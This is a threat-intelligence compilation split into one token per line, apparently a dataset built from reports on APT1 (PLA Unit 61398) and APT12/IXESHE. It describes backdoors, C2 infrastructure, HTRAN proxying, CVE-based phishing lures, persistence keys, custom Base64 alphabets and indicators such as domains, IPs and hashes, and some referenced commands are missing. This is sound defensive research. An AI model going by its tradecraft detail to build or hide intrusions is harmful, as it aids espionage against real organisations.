 
In
an
effort
to
underscore
there
are
actual
individuals
behind
the
keyboard
,
Mandiant
is
revealing
three
personas
we
have
attributed
to
APT1
.
 
These
operators
,
like
soldiers
,
may
merely
be
following
orders
given
to
them
by
others
.
 
Our
analysis
has
led
us
to
conclude
that
APT1
is
likely
government-sponsored
and
one
of
the
most
persistent
of
China
s
cyber
threat
actors
.
 
We
believe
that
APT1
is
able
to
wage
such
a
long-running
and
extensive
cyber
espionage
campaign
in
large
part
because
it
receives
direct
government
support
.
 
In
seeking
to
identify
the
organization
behind
this
activity
,our
research
found
that
People
s
Liberation
Army
(
PLA
s
)
Unit
61398
is
similar
to
APT1
in
its
mission
,
capabilities
,
and
resources
.
 
PLA
Unit
61398
is
also
located
in
precisely
the
same
area
from
which
APT1
activity
appears
to
originate
.
 
APT1
is
believed
to
be
the
2nd
Bureau
of
the
People
s
Liberation
Army
(
PLA
)
General
Staff
Department
s
(
GSD
)
3rd
Department
,
which
is
most
commonly
known
by
its
Military
Unit
Cover
Designator
(
MUCD
)
as
Unit
61398
.
 
The
nature
of
Unit
61398
s
work
is
considered
by
China
to
be
a
state
secret
;
however
,
we
believe
it
engages
in
harmful
Computer
Network
Operations.
Unit
61398
is
partially
situated
on
Datong
Road
in
Gaoqiaozhen
,
which
is
located
in
the
Pudong
New
Area
of
Shanghai
.
 
The
central
building
in
this
compound
is
a
130,663
square
foot
facility
that
is
12
stories
high
and
was
built
in
early
2007
.
 
APT1
has
systematically
stolen
hundreds
of
terabytes
of
data
from
at
least
141
organizations
,
and
has
demonstrated
the
capability
and
intent
to
steal
from
dozens
of
organizations
simultaneously
.
 
Since
2006
,
Mandiant
has
observed
APT1
compromise
141
companies
spanning
20
major
industries
.
 
APT1
has
a
well-defined
attack
methodology
,
honed
over
years
and
designed
to
steal
large
volumes
of
valuable
intellectual
property
.
 
Once
APT1
has
established
access
,
they
periodically
revisit
the
victim
s
network
over
several
months
or
years
and
steal
broad
categories
of
intellectual
property
,
including
technology
blueprints
,
proprietary
manufacturing
processes
,
test
results
,
business
plans
,
pricing
documents
,
partnership
agreements
,
and
emails
and
contact
lists
from
victim
organizations
leadership
.
 
APT1
uses
some
tools
and
techniques
that
we
have
not
yet
observed
being
used
by
other
groups
including
two
utilities
designed
to
steal
email
GETMAIL
and
MAPIGET
.
 
Establishing
a
foothold
involves
actions
that
ensure
control
of
the
target
network
s
systems
from
outside
the
network
.
 
APT1
establishes
a
foothold
once
email
recipients
open
a
malicious
file
and
a
backdoor
is
subsequently
installed
.
 
A
backdoor
is
software
that
allows
an
intruder
to
send
commands
to
the
system
remotely
.
 
In
almost
every
case
,
APT
backdoors
initiate
outbound
connections
to
the
intruder
s
command
and
control
(
C2
)
server
.
 
APT
intruders
employ
this
tactic
because
while
network
firewalls
are
generally
adept
at
keeping
malware
outside
the
network
from
initiating
communication
with
systems
inside
the
network
,
they
are
less
reliable
at
keeping
malware
that
is
already
inside
the
network
from
communicating
to
systems
outside
.
 
While
APT1
intruders
occasionally
use
publicly
available
backdoors
such
as
Poison
Ivy
and
Gh0st
RAT
,
the
vast
majority
of
the
time
they
use
what
appear
to
be
their
own
custom
backdoors
.
 
We
will
describe
APT1
s
backdoors
in
two
categories
:
Beachhead
Backdoors
and
Standard
Backdoors.
Beachhead
backdoors
are
typically
minimally
featured
.
 
They
offer
the
attacker
a
toe-hold
to
perform
simple
tasks
like
retrieve
files
,
gather
basic
system
information
and
trigger
the
execution
of
other
more
significant
capabilities
such
as
a
standard
backdoor
.
 
APT1
s
beachhead
backdoors
are
usually
what
we
call
WEBC2
backdoors
.
 
WEBC2
backdoors
are
probably
the
most
well-known
kind
of
APT1
backdoor
,
and
are
the
reason
why
some
security
companies
refer
to
APT1
as
the
Comment
Crew.
A
WEBC2
backdoor
is
designed
to
retrieve
a
webpage
from
a
C2
server
.
 
It
expects
the
webpage
to
contain
special
HTML
tags
;
the
backdoor
will
attempt
to
interpret
the
data
between
the
tags
as
commands
.
 
Older
versions
of
WEBC2
read
data
between
HTML
comments
,
though
over
time
WEBC2
variants
have
evolved
to
read
data
contained
within
other
types
of
tags
.
 
From
direct
observation
,
we
can
confirm
that
APT1
was
using
WEBC2
backdoors
as
early
as
July
2006
.
 
However
,
the
first
compile
time35
we
have
for
WEBC2
is
2004-01-23
,
suggesting
that
APT1
has
been
crafting
WEBC2
backdoors
since
early
2004
.
 
Based
on
the
400+
samples
of
WEBC2
variants
that
we
have
accumulated
,
it
appears
that
APT1
has
direct
access
to
developers
who
have
continually
released
new
WEBC2
variants
for
over
six
years
.
 
WEBC2
backdoors
are
often
packaged
with
spear
phishing
emails
.
 
Once
installed
,
APT1
intruders
have
the
option
to
tell
victim
systems
to
download
and
execute
additional
malicious
software
of
their
choice
.
 
WEBC2
backdoors
work
for
their
intended
purpose
,
but
they
generally
have
fewer
features
than
the
Standard
Backdoors
described
below
.
 
The
standard
,
non-WEBC2
APT1
backdoor
typically
communicates
using
the
HTTP
protocol
(
to
blend
in
with
legitimate
web
traffic
)
or
a
custom
protocol
that
the
malware
authors
designed
themselves
.
 
These
backdoors
give
APT
intruders
a
laundry
list
of
ways
to
control
victim
systems
.
 
The
BISCUIT
backdoor
(
so
named
for
the
command
bdkzt
)
is
an
illustrative
example
of
the
range
of
commands
that
APT1
has
built
into
its
standard
backdoors
.
 
APT1
has
used
and
steadily
modified
BISCUIT
since
as
early
as
2007
and
continues
to
use
it
presently
.
 
Some
APT
backdoors
attempt
to
mimic
legitimate
Internet
traffic
other
than
the
HTTP
protocol
.
 
When
network
defenders
see
the
communications
between
these
backdoors
and
their
C2
servers
,
they
might
easily
dismiss
them
as
legitimate
network
traffic
.
 
APT1
.
 
APT1
maintains
an
extensive
infrastructure
of
computers
around
the
world
.
 
We
have
evidence
suggesting
that
APT1
manually
controls
thousands
of
systems
in
support
of
their
attacks
,
and
have
directly
observed
their
control
over
hundreds
of
these
systems
.
 
Although
they
control
systems
in
dozens
of
countries
,
their
attacks
originate
from
four
large
networks
in
Shanghai
two
of
which
are
allocated
directly
to
the
Pudong
New
Area
,
the
home
of
Unit
61398
.
 
The
sheer
number
of
APT1
IP
addresses
concentrated
in
these
Shanghai
ranges
,
coupled
with
Simplified
Chinese
keyboard
layout
settings
on
APT1
s
attack
systems
,
betrays
the
true
location
and
language
of
the
operators
.
 
To
help
manage
the
vast
number
of
systems
they
control
,
APT1
has
registered
hundreds
of
domain
names
,
the
majority
of
which
also
point
to
a
Shanghai
locale
.
 
The
domain
names
and
IP
addresses
together
comprise
APT1
s
command
and
control
framework
which
they
manage
in
concert
to
camouflage
their
true
origin
from
their
English
speaking
targets
.
 
As
covered
in
the
previous
Attack
Lifecycle
section
,
WEBC2
backdoor
variants
download
and
interpret
data
stored
between
tags
in
HTML
pages
as
commands
.
 
They
usually
download
HTML
pages
from
a
system
within
APT1
s
hop
infrastructure
.
 
We
have
observed
APT1
intruders
logging
in
to
WEBC2
servers
and
manually
editing
the
HTML
pages
that
backdoors
will
download
.
 
Because
the
commands
are
usually
encoded
and
difficult
to
spell
from
memory
,
APT1
intruders
typically
do
not
type
these
strings
,
but
instead
copy
and
paste
them
into
the
HTML
files
.
 
They
likely
generate
the
encoded
commands
on
their
own
systems
before
pasting
them
in
to
an
HTML
file
hosted
by
the
hop
point
.
 
For
example
,
we
observed
an
APT
attacker
pasting
the
string
czo1NA==
into
an
HTML
page
.
 
That
string
is
the
base64
encoded
version
of
s
:
54
,
meaning
sleep
for
54
minutes
(
or
hours
,
depending
on
the
particular
backdoor
)
.
 
In
lieu
of
manually
editing
an
HTML
file
on
a
hop
point
,
we
have
also
observed
APT1
intruders
uploading
new
(
already-edited
)
HTML
files
.
 
When
APT1
attackers
are
not
using
WEBC2
,
they
require
a
command
and
control
(
C2
)
user
interface
so
they
can
issue
commands
to
the
backdoor
.
 
This
interface
sometimes
runs
on
their
personal
attack
system
,
which
is
typically
in
Shanghai
.
 
In
these
instances
,
when
a
victim
backdoor
makes
contact
with
a
hop
,
the
communications
need
to
be
forwarded
from
the
hop
to
the
intruder
s
Shanghai
system
so
the
backdoor
can
talk
to
the
C2
server
software
.
 
We
have
observed
767
separate
instances
in
which
APT1
intruders
used
the
publicly
available
HUC
Packet
Transmit
Tool
or
HTRAN
on
a
hop
.
 
As
always
,
keep
in
mind
that
these
uses
are
confirmed
uses
,
and
likely
represent
only
a
small
fraction
of
APT1
s
total
activity
.
 
The
HTRAN
utility
is
merely
a
middle-man
,
facilitating
connections
between
the
victim
and
the
attacker
who
is
using
the
hop
point
.
 
Typical
use
of
HTRAN
is
fairly
simple
:
the
attacker
must
specify
the
originating
IP
address
(
of
his
or
her
workstation
in
Shanghai
)
,
and
a
port
on
which
to
accept
connections
.
 
For
example
,
the
following
command
,
which
was
issued
by
an
APT1
actor
,
will
listen
for
incoming
connections
on
port
443
on
the
hop
and
automatically
proxy
them
to
the
Shanghai
IP
address
58.247.242.254
on
port
443
.
 
Occasionally
,
APT1
attackers
have
installed
C2
server
components
on
systems
in
their
hop
infrastructure
rather
than
forwarding
connections
back
to
C2
servers
in
Shanghai
.
 
In
these
instances
they
do
not
need
to
use
a
proxy
tool
like
HTRAN
to
interact
with
victim
systems
.
 
However
,
it
does
mean
that
the
intruders
need
to
be
able
to
interface
with
the
(
often
graphical
)
C2
server
software
running
on
the
hop
.
 
We
have
observed
APT1
intruders
log
in
to
their
hop
point
,
start
the
C2
server
,
wait
for
incoming
connections
,
and
then
proceed
to
give
commands
to
victim
systems
.
 
WEBC2
variants
may
include
a
server
component
that
provides
a
simple
C2
interface
to
the
intruder
.
 
This
saves
the
intruder
from
having
to
manually
edit
webpages
.
 
That
is
,
this
server
component
receives
connections
from
victim
backdoors
,
displays
them
to
the
intruder
,
and
then
translates
the
intruder
s
commands
into
HTML
tags
that
the
victim
backdoors
read
.
 
In
the
last
two
years
alone
,
we
have
confirmed
937
APT1
C2
servers
that
is
,
actively
listening
or
communicating
programs
running
on
849
distinct
IP
addresses
.
 
However
,
we
have
evidence
to
suggest
that
APT1
is
running
hundreds
,
and
likely
thousands
,
of
other
servers
(
see
the
Domains
section
below
)
.
 
The
programs
acting
as
APT1
servers
have
mainly
been
:
FTP
,
for
transferring
files
;
web
,
primarily
for
WEBC2
;
RDP
,
for
remote
graphical
control
of
a
system
;
HTRAN
,
for
proxying
;
and
C2
servers
associated
with
various
backdoor
families
.
 
The
Domain
Name
System
(
DNS
)
is
the
phone
book
of
the
Internet
.
 
In
the
same
way
that
people
program
named
contacts
into
their
cell
phones
and
no
longer
need
to
remember
phone
numbers
,
DNS
allows
people
to
remember
names
like
google.com
instead
of
IP
addresses
.
 
When
a
person
types
google.com
into
a
web
browser
,
a
DNS
translation
to
an
IP
address
occurs
so
that
the
person
s
computer
can
communicate
with
Google
.
 
Names
that
can
be
translated
through
DNS
to
IP
addresses
are
referred
to
as
Fully
Qualified
Domain
Names
(
FQDNs
)
.
 
A
DNS
zone
represents
a
collection
of
FQDNs
that
end
with
the
same
name
,
and
which
are
usually
registered
through
a
domain
registration
company
and
controlled
by
a
single
owner
.
 
For
example
,
hugesoft.org
is
an
FQDN
but
also
represents
a
zone
.
 
The
FQDNs
ug-co.hugesoft.org
and
7cback.hugesoft.org
are
part
of
the
hugesoft.org
zone
and
are
called
subdomains
of
the
zone
.
 
The
person
who
registered
hugesoft.org
may
add
as
many
subdomains
as
they
wish
and
controls
the
IP
resolutions
of
these
FQDNs
.
 
APT1
has
registered
at
least
107
zones
since
2004
.
 
Within
these
zones
,
we
know
of
thousands
of
FQDNs
that
have
resolved
to
hundreds
of
IP
addresses
(
which
we
suspect
are
hops
)
and
in
some
instances
to
APT1
s
source
IP
addresses
in
Shanghai
.
 
The
first
zone
we
became
aware
of
was
hugesoft.org
,
which
was
registered
through
eNom
,
Inc.
in
October
2004
.
 
The
registrant
supplied
uglygorilla@163.com
as
an
email
address
.
 
The
supplied
registration
information
,
which
is
still
visible
in
public
whois
data
as
of
February
3,
2013
.
 
The
supplied
registrant
information
does
not
need
to
be
accurate
for
the
zone
to
be
registered
successfully
.
 
For
example
,
shanghai
is
not
a
street
name
.
 
Nevertheless
,
it
is
noteworthy
that
Shanghai
appeared
in
the
first
known
APT1
domain
registration
,
along
with
a
phone
number
that
begins
with
China
s
+86
international
code
.
 
In
fact
,
Shanghai
was
listed
as
the
registrant
s
city
in
at
least
24
of
the
107
(
22%
)
registrations
.
 
Overall
,
the
combination
of
a
relatively
high
number
of
Shanghai
registrations
with
obviously
false
registration
examples
in
other
registrations
suggests
a
partially
uncoordinated
domain
registration
campaign
from
2004
until
present
,
in
which
some
registrants
tried
to
fabricate
non-Shanghai
locations
but
others
did
not
.
 
This
is
supported
by
contextual
information
on
the
Internet
for
the
email
address
lfengg@163.com
,
which
was
supplied
in
the
registration
information
for
seven
of
the
107
zones
.
 
On
the
site
www.china-one.org
,
the
email
address
lfengg@163.com
appears
as
the
contact
for
the
Shanghai
Kai
Optical
Information
Technology
Co.
,
Ltd.
,
a
website
production
company
located
in
a
part
of
Shanghai
that
is
across
the
river
from
PLA
Unit
61398
.
 
About
half
of
APT1
s
known
zones
were
named
according
to
three
themes
:
news
,
technology
and
business
.
 
These
themes
cause
APT1
command
and
control
addresses
to
appear
benign
at
first
glance
.
 
However
,
we
believe
that
the
hundreds
of
FQDNs
within
these
zones
were
created
for
the
purpose
of
APT1
intrusions
.
 
(
Note
:
these
themes
are
not
unique
to
APT1
or
even
APT
in
general
.
 
)
The
news-themed
zones
include
the
names
of
well-known
news
media
outlets
such
as
CNN
,
Yahoo
and
Reuters
.
 
However
,
they
also
include
names
referencing
English-speaking
countries
,
such
as
aunewsonline.com
(
Australia
)
,
canadatvsite.com
(
Canada
)
,
and
todayusa.org
(
U.S
.
 
)
.
 
Below
is
a
list
of
zones
registered
by
APT1
that
are
newsthemed
:
aoldaily.com
aunewsonline.com
canadatvsite.com
canoedaily.com
cnndaily.com
cnndaily.net
cnnnewsdaily.com
defenceonline.net
freshreaders.net
giftnews.org
reutersnewsonline.com
rssadvanced.org
saltlakenews.org
sportreadok.net
todayusa.org
usapappers.com
usnewssite.com
yahoodaily.com
.
 
The
technology-themed
zones
reference
well-known
technology
companies
(
AOL
,
Apple
,
Google
,
Microsoft
)
,
antivirus
vendors
(
McAfee
,
Symantec
)
,
and
products
(
Blackberry
,
Bluecoat
)
.
 
APT1
also
used
more
generic
names
referencing
topics
like
software
:
globalowa.com
gmailboxes.com
hugesoft.org
idirectech.com
ifexcel.com
infosupports.com
livemymsn.com
mcafeepaying.com
microsoft-update-info.com
micyuisyahooapis.com
msnhome.org
pcclubddk.net
progammerli.com
softsolutionbox.net
symanteconline.net
webservicesupdate.com
.
 
Finally
,
some
zones
used
by
APT1
reflect
a
business
theme
.
 
The
names
suggest
websites
that
professionals
might
visit
:
advanbusiness.com
businessconsults.net
businessformars.com
companyinfosite.com
conferencesinfo.com
copporationnews.com
.
 
APT1
intruders
often
use
the
FQDNs
that
are
associated
with
legitimate
websites
hosted
by
their
hop
points
.
 
We
consider
these
domains
to
be
hijacked
because
they
were
registered
by
someone
for
a
legitimate
reason
,
but
have
been
leveraged
by
APT1
for
malicious
purposes
.
 
APT1
uses
hijacked
FQDNs
for
two
main
purposes
.
 
First
,
they
place
malware
(
usually
in
ZIP
files
)
on
the
legitimate
websites
hosted
on
the
hop
point
and
then
send
spear
phishing
emails
with
a
link
that
includes
the
legitimate
FQDN
.
 
APT12
.
 
This
research
paper
will
delve
into
another
prominent
group
of
attackers
referred
to
as
IXESHE
(
pronounced
i-sushi
)
,
based
on
one
of
the
more
common
detection
names
security
companies
use
for
the
malware
they
utilize
.
 
This
campaign
is
notable
for
targeting
East
Asian
governments
,
electronics
manufacturers
,
and
a
telecommunications
company
.
 
The
IXESHE
campaign
makes
use
of
targeted
emails
with
malicious
attachments
to
compromise
victims
systems
.
 
The
emails
are
often
tailored
for
specific
victims
and
contain
malicious
attachments
that
are
almost
always
weaponized
.PDF
files
with
known
exploits
that
drop
malware
executables
onto
targeted
systems
.
 
In
addition
,
the
IXESHE
attackers
conducted
two
specific
attacks
that
leveraged
zero-day
exploitsone
in
2009
and
another
in
2011
.
 
The
IXESHE
attackers
almost
always
make
use
of
compromised
servers
as
command-and-control
(
C&C
)
servers
.
 
In
some
cases
,
the
compromised
servers
are
hosted
on
target
organizations
networks
after
successful
infiltration
so
the
attackers
can
increase
their
control
of
the
victims
infrastructure
.
 
Using
this
approach
,
the
attackers
amassed
at
least
60
C&C
servers
over
time
.
 
This
technique
also
allows
the
attackers
to
cover
their
tracks
,
as
having
the
C&C
server
in
the
victims
corporate
networks
means
very
little
C&C
traffic
leaves
them
.
 
The
attackers
deliberate
use
of
compromised
machines
and
dynamic
Domain
Name
System
(
DNS
)
services
allows
them
to
hide
traces
of
their
presence
by
confusing
their
activities
with
data
belonging
to
legitimate
individuals
.
 
Looking
at
threat
intelligence
derived
from
tracking
APT
campaigns
over
time
primarily
based
on
the
network
traffic
generated
by
the
malware
used
,
we
were
able
to
develop
indicators
of
compromise
for
the
IXESHE
campaign
.
 
The
malware
samples
used
in
this
campaign
were
not
very
complicated
by
nature
but
do
give
the
attackers
almost
complete
control
over
their
targets
compromised
systems
.
 
Most
of
the
IP
addresses
of
IXESHE
s
victims
are
linked
to
DSL
networks
,
which
made
it
difficult
to
determine
their
identities
.
 
Careful
research
,
however
,
allowed
the
identification
of
some
of
the
attackers
victims
:
East
Asian
governments
,
Taiwanese
electronics
manufacturers
,
A
telecommunications
company
.
 
Campaign
victims
were
identified
by
using
Whois
records
and
open
source
research
.
 
Trend
Micro
generally
notifies
customers
that
are
believed
to
have
been
specifically
targeted
by
APT
campaigns
.
 
The
IXESHE
attackers
have
been
actively
launching
highly
targeted
attacks
since
at
least
July
2009
.
 
Available
data
on
the
IXESHE
campaign
indicates
that
targeted
emails
with
malicious
.PDF
file
attachments
were
the
attackers
vector
of
choice
.
 
In
most
cases
,
the
attacks
involved
Adobe
Acrobat
,
Reader
,
and
Flash
Player
exploits
such
as
:
CVE-2009-4324
,
CVE-2009-0927
,
CVE-2011-0609
,
CVE-2011-0611
.
 
It
should
also
be
noted
that
this
campaign
used
CVE-2009-4324
and
CVE-2011-0609
exploits
when
these
were
still
unpatched
or
considered
zero-day
vulnerabilities
.
 
The
IXESHE
attackers
also
used
an
exploit
that
affected
Microsoft
Excel
CVE-2009-3129
.
 
Every
IXESHE
case
we
examined
revealed
that
the
original
infection
vector
was
a
targeted
email
with
a
PDF
exploit
as
attachment
.
 
Older
versions
also
used
an
XLS
exploit
.
 
Opening
the
.PDF
file
drops
and
executes
a
malware
in
a
victim
s
system
.
 
The
malware
displays
a
blank
.PDF
file
or
a
decoy
document
related
to
the
targeted
attack
.
 
The
emails
normally
come
from
compromised
personal
accounts
or
are
entirely
spoofed
.
 
emails
from
spoofed
senders
were
usually
sent
via
mail
servers
in
the
United
States
and
China
.
 
The
malware
also
sets
the
executable
file
s
attributes
to
Hidden.
Some
of
the
file
names
the
attackers
used
include
:
winhlps.exe
,
acrotry.exe
,
AcroRd32.exe
,
Updater.exe
.
 
In
order
for
the
malware
to
survive
rebooting
,
it
normally
creates
the
following
registry
run
key
:
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
.
 
The
registry
run
key
,
in
turn
,
points
to
the
malware
that
has
been
dropped
.
 
The
value
name
of
this
entry
varies
from
sample
to
sample
.
 
Some
of
the
names
the
attackers
used
for
it
include
:
Adobe
Assistant
,
Migrated
.
 
Upon
installation
,
the
malware
starts
communicating
with
one
of
its
C&C
servers
.
 
Most
of
the
samples
appeared
to
have
at
least
three
C&C
servers
hard
coded
for
redundancy
.
 
Some
samples
alternatively
use
an
FGKD.jsp
or
an
FPK.jsp
file
.
 
The
Base64
blob
is
of
particular
interest
.
 
It
makes
use
of
a
custom
Base64
alphabet
.
 
Once
decoded
,
this
blob
reveals
a
standardized
structure
of
the
information
sent
to
the
registered
C&C
server
,
which
includes
the
following
details
:
Computer
name
,
Local
IP
address
,
Proxy
server
IP
and
port
,
Malware
ID
.
 
To
date
,
we
have
seen
several
custom
Base64
alphabets
,
including
:
+NO5RZaGHviIjhYq8b4ndQ=p012ySTcCDrs/xPgUz67FM3wemKfkJLBo9VtWXlEuA
,
HZa4vjIiGndQ=p012y+NO5RST/xPgUz67FMhYq8b3wemKfkJLBocCDrs9VtWXlEu
,
j4vpGZaHnIdQ=i012y+N/zPgUO5RSTx67FMhYb8q3we
mKckJLBofCDrs9VtWXlEu
,
p12kJLBofCDrs9VtWXlEuainyj4vd+=H0GZIQNO5RST/
zPgUx67FMhYb8q3wemKc
,
aZHGviIj4ndQ=p012y+NO5RST/xPgUz67FMhYq8b3wemKfkJLBocCDrs9VtWXlEu
,
ZvQIajHi4ndG=p012y+NO5RST/xPgUz67FMhYq8b3wemKfkJLBocCDrs9VtWXlEu
.
 
Some
similarities
exist
across
different
versions
of
the
Base64
alphabet
,
which
indicates
that
these
are
most
likely
not
completely
randomly
generated
.
 
Instead
,
the
attackers
manually
cut
and
pasted
older
versions
after
altering
some
parts
.
 
The
malware
ID
seems
to
be
a
campaign
code
with
a
different
IP
address
for
each
attack
.
 
Some
of
the
campaign
codes
we
have
seen
include
:
CRML_0505
,
CRML_MIL
,
Firebox4
,
JUST_0525
,
ML0628
,
MW0629
,
OM222
.
 
The
IXESHE
campaign
has
been
successfully
executing
targeted
attacks
since
2009
.
 
The
attackers
primarily
use
malicious
.PDF
files
that
exploit
vulnerabilities
in
Adobe
Reader
,
Acrobat
,
and
Flash
Player
,
including
the
use
of
two
zero-day
exploitsone
in
2009
and
another
in
2011
.
 
While
the
attackers
primarily
targeted
East
Asian
governments
in
the
past
,
they
have
also
started
targeting
a
telecommunications
company
and
electronics
manufacturers
.
 
They
kept
track
of
their
targeted
attacks
by
embedding
a
campaign
tag
in
the
malware
that
appears
to
describe
when
each
attack
was
launched
and
,
in
some
cases
,
the
nature
of
its
target
.
 
We
found
more
than
40
of
these
campaign
tags
.
 
The
IXESHE
attackers
are
notable
for
their
use
of
compromised
machines
within
a
target
s
internal
network
as
C&C
servers
.
 
This
helped
disguise
their
activities
.
 
In
addition
,
the
attackers
use
of
the
proxy
tool
,
HTran
,
also
helped
mask
their
true
location
.
 
While
their
identities
remain
unknown
,
the
attackers
behind
the
IXESHE
campaign
demonstrated
that
they
were
both
determined
and
capable
.
 
While
the
malware
used
in
the
attacks
were
not
very
complicated
by
nature
,
these
proved
very
effective
.
 
APT12
.
 
The
attackers
referred
to
as
APT12
(
also
known
as
IXESHE
,
DynCalc
,
and
DNSCALC
)
recently
started
a
new
campaign
targeting
organizations
in
Japan
and
Taiwan
.
 
APT12
is
believed
to
be
a
cyber
espionage
group
thought
to
have
links
to
the
Chinese
People's
Liberation
Army
.
 
APT12
's
targets
are
consistent
with
larger
People's
Republic
of
China
(
PRC
)
goals
.
 
Intrusions
and
campaigns
conducted
by
this
group
are
in-line
with
PRC
goals
and
self-interest
in
Taiwan
.
 
Additionally
,
the
new
campaigns
we
uncovered
further
highlight
the
correlation
between
APT
groups
ceasing
and
retooling
operations
after
media
exposure
,
as
APT12
used
the
same
strategy
after
compromising
the
New
York
Times
in
Oct
2012
.
 
Much
like
Darwin
s
theory
of
biological
evolution
,
APT12
been
forced
to
evolve
and
adapt
in
order
to
maintain
its
mission
.
 
FireEye
researchers
discovered
two
possibly
related
campaigns
utilizing
two
other
backdoors
known
as
THREEBYTE
and
WATERSPOUT
.
 
Both
backdoors
were
dropped
from
malicious
documents
built
utilizing
the
Tran
Duy
Linh
exploit
kit
,
which
exploited
CVE-2012-0158
.
 
These
documents
were
also
emailed
to
organizations
in
Japan
and
Taiwan
.
 
While
APT12
has
previously
used
THREEBYTE
,
it
is
unclear
if
APT12
was
responsible
for
the
recently
discovered
campaign
utilizing
THREEBYTE
.
 
Similarly
,
WATERSPOUT
is
a
newly
discovered
backdoor
and
the
threat
actors
behind
the
campaign
have
not
been
positively
identified
.
 
However
,
the
WATERSPOUT
campaign
shared
several
traits
with
the
RIPTIDE
and
HIGHTIDE
campaign
that
we
have
attributed
to
APT12
.
 
From
October
2012
to
May
2014,
FireEye
observed
APT12
utilizing
RIPTIDE
,
a
proxy-aware
backdoor
that
communicates
via
HTTP
to
a
hard-coded
command
and
control
(
C2
)
server
.
 
RIPTIDE
s
first
communication
with
its
C2
server
fetches
an
encryption
key
,
and
the
RC4
encryption
key
is
used
to
encrypt
all
further
communication
.
 
In
June
2014,
Arbor
Networks
published
an
article
describing
the
RIPTIDE
backdoor
and
its
C2
infrastructure
in
great
depth
.
 
The
blog
highlighted
that
the
backdoor
was
utilized
in
campaigns
from
March
2011
till
May
2014
.
 
Following
the
release
of
the
article
,
FireEye
observed
a
distinct
change
in
RIPTIDE
s
protocols
and
strings
.
 
We
suspect
this
change
was
a
direct
result
of
the
Arbor
blog
post
in
order
to
decrease
detection
of
RIPTIDE
by
security
vendors
.
 
The
changes
to
RIPTIDE
were
significant
enough
to
circumvent
existing
RIPTIDE
detection
rules
.
 
FireEye
dubbed
this
new
malware
family
HIGHTIDE
.
 
On
Sunday
August
24,
2014
we
observed
a
spear
phish
email
sent
to
a
Taiwanese
government
ministry
.
 
Attached
to
this
email
was
a
malicious
Microsoft
Word
document
(
MD5:
f6fafb7c30b1114befc93f39d0698560
)
that
exploited
CVE-2012-0158
.
 
It
is
worth
noting
that
this
email
appeared
to
have
been
sent
from
another
Taiwanese
Government
employee
,
implying
that
the
email
was
sent
from
a
valid
but
compromised
account
.
 
HIGHTIDE
:
6e59861931fa2796ee107dc27bfdd480
.
 
The
HIGHTIDE
backdoor
connected
directly
to
141.108.2.157
.
 
If
you
compare
the
HTTP
GET
request
from
the
RIPTIDE
samples
to
the
HTTP
GET
request
from
the
HIGHTIDE
samples
you
can
see
the
malware
author
changed
the
following
items
:
User
Agent
,
Format
and
structure
of
the
HTTP
Uniform
Resource
Identifier
(
URI
)
.
 
Similar
to
RIPTIDE
campaigns
,
APT12
infects
target
systems
with
HIGHTIDE
using
a
Microsoft
Word
(
.doc
)
document
that
exploits
CVE-2012-0158
.
 
FireEye
observed
APT12
deliver
these
exploit
documents
via
phishing
emails
in
multiple
cases
.
 
Based
on
past
APT12
activity
,
we
expect
the
threat
group
to
continue
to
utilize
phishing
as
a
malware
delivery
method
.
 
0824.1.doc
:
f6fafb7c30b1114befc93f39d0698560
,
CVE-2012-0158
.
 
Jason_invitation.doc
:
00a95fb30be2d6271c491545f6c6a707
,
CVE-2012-0158
.
 
When
the
file
is
opened
,
it
drops
HIGHTIDE
in
the
form
of
an
executable
file
onto
the
infected
system
.
 
RIPTIDE
and
HIGHTIDE
differ
on
several
points
:
executable
file
location
,
image
base
address
,
the
User-Agent
within
the
GET
requests
,
and
the
format
of
the
URI
.
 
The
RIPTIDE
exploit
document
drops
its
executable
file
into
the
C:\Documents
and
Settings\{user}\Application
Data\Location
folder
while
the
HIGHTIDE
exploit
document
drops
its
executable
file
into
the
C:\DOCUMENTS
and
SETTINGS\{user}\LOCAL
SETTINGS\Temp\
folder
.
 
All
but
one
sample
that
we
identified
were
written
to
this
folder
as
word.exe
.
 
The
one
outlier
was
written
as
winword.exe
.
 
Research
into
this
HIGHTIDE
campaign
revealed
APT12
targeted
multiple
Taiwanese
Government
organizations
between
August
22
and
28
.
 
On
Monday
August
25,
2014
we
observed
a
different
spear
phish
email
sent
from
lilywang823@gmail.com
to
a
technology
company
located
in
Taiwan
.
 
This
spear
phish
contained
a
malicious
Word
document
that
exploited
CVE-2012-0158
.
 
The
MD5
of
the
exploit
document
was
e009b95ff7b69cbbebc538b2c5728b11
.
 
Similar
to
the
newly
discovered
HIGHTIDE
samples
documented
above
,
this
malicious
document
dropped
a
backdoor
to
C:\DOCUMENTS
and
SETTINGS\{user}\LOCAL
SETTINGS\Temp\word.exe
.
 
THREEBYTE
:
16e627dbe730488b1c3d448bfc9096e2
.
 
This
backdoor
sent
the
following
callback
traffic
to
video.csmcpr.com
.
 
The
THREEBYTE
spear
phishing
incident
(
while
not
yet
attributed
)
shared
the
following
characteristics
with
the
above
HIGHTIDE
campaign
attributed
to
APT12
:
The
THREEBYTE
backdoor
was
compiled
two
days
after
the
HIGHTIDE
backdoors
;
Both
the
THREEBYTE
and
HIGHTIDE
backdoors
were
used
in
attacks
targeting
organizations
in
Taiwan
;
Both
the
THREEBYTE
and
HIGHTIDE
backdoors
were
written
to
the
same
filepath
of
C:\DOCUMENTS
and
SETTINGS\{user}\LOCAL
SETTINGS\Temp\word.exe
;
APT12
has
previously
used
the
THREEBYTE
backdoor
.
 
On
August
25,
2014,
we
observed
another
round
of
spear
phishing
emails
targeting
a
high-technology
company
in
Japan
.
 
Attached
to
this
email
was
another
malicious
document
that
was
designed
to
exploit
CVE-2012-0158
.
 
This
malicious
Word
document
had
an
MD5
of
499bec15ac83f2c8998f03917b63652e
and
dropped
a
backdoor
to
C:\DOCUMENTS
and
SETTINGS\{user}\LOCAL
SETTINGS\Temp\word.exe
.
 
The
backdoor
had
the
following
properties
:
WATERSPOUT
:
f9cfda6062a8ac9e332186a7ec0e706a
.
 
The
backdoor
connects
to
a
command
and
control
server
at
icc.ignorelist.com
.
 
Similar
to
RIPTIDE
and
HIGHTIDE
,
the
WATERSPOUT
backdoor
is
an
HTTP
based
backdoor
that
communicates
with
its
C2
server
.
 
Although
there
are
no
current
infrastructure
ties
to
link
this
backdoor
to
APT12
,
there
are
several
data
points
that
show
a
possible
tie
to
the
same
actors
:
Same
initial
delivery
method
(
spear
phishing
email
)
with
a
Microsoft
Word
Document
exploiting
CVE-2012-0158
.
 
The
same
Tran
Duy
Linh
Microsoft
Word
Exploit
Kit
was
used
in
delivery
of
